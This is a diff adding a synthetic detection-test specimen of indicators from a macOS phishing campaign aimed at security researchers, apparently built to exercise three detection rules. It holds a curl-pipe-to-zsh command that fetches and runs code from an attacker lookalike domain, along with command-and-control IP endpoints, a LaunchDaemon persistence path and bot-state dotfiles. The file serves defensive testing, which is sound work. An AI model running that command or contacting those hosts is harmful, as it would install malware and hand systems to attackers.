@@ -1,0 +1,22 @@
+# Synthetic specimen — macOS branch of the post-DEF CON researcher phishing
+# campaign (Huntress 2026-08-19). Distinctive strings reconstructed from the
+# report; not the live binary. Exercises all three rules.
+DecryptPanel.html
+curl -fsSL https://apple-googleapi.com/i | zsh
+github.com/ariasalmonterachel13/gapi/releases
+GAPIUpdate.dmg
+sha256 GAPIUpdate: 15afe14b5db2896d35a0c4f3139db85158da120fa90613c975c88f10bbbcc420
+/tmp/lksopo
+http://86.54.25.213/log
+http://192.253.248.181/api/v1/getscpt/admin
+/Library/LaunchDaemons/com.xdivcmp.plist
+~/.phost
+~/.bhost
+~/.username
+~/.botid
+~/.pwd
+~/.uninstalled
+~/.lastaction
+apple.eu03hub.com
+microsoft.eu02hub.com
+docsend.online/download/drivers
